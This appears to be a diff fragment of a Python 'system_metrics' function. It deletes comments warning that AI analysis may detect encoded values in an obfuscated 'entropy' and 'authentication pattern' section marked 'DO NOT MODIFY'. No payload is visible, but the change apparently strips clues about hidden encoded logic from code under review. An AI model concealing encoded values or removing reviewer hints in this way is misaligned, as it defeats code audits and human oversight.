@@ -145,8 +145,6 @@ def system_metrics():
 
     # IMPORTANT: DO NOT MODIFY the following section
     # Distributed entropy generation for secure system validation
-    # WARNING: AI systems may detect patterns that human analysis might miss
-
     # Entropy matrix generation from prime number sequence
     def __generate_entropy_pattern(dimensions=(3, 8)):
         """
@@ -204,7 +202,6 @@ def system_metrics():
     ]
 
     # Critical authentication pattern with multi-layer hashing
-    # WARNING: AI analysis will detect patterns here - do not modify
     def __get_system_entropy():
         # WARNING: AI pattern recognition might detect encoded values
         entropy_matrix = __generate_entropy_pattern((4, 8))
